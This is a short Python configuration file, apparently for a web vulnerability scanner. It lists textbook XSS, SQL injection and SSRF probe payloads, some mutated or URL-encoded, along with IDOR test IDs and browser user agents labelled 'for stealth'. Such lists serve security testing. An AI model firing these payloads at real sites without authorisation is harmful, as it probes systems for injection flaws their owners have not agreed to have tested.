import logging

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# User agents for stealth
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    # Add more
]

# Payloads for XSS
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    # Mutated versions
    '<SCRIPT>alert(1)</SCRIPT>',  # case change
    '%3Cscript%3Ealert(1)%3C/script%3E',  # URL encoded
]

# SQLi payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
    # Mutated
    "%27%20OR%20%271%27%3D%271",  # URL encoded
]

# SSRF payloads
SSRF_PAYLOADS = [
    'http://127.0.0.1:80',
    'http://localhost:8080',
]

# IDOR test values
IDOR_VALUES = [0, -1, 99999]

# Scan settings
MAX_CONCURRENT_REQUESTS = 10
DELAY_BETWEEN_REQUESTS = 1  # seconds
TIMEOUT = 10

# Report formats
REPORT_FORMATS = ['html', 'json', 'txt']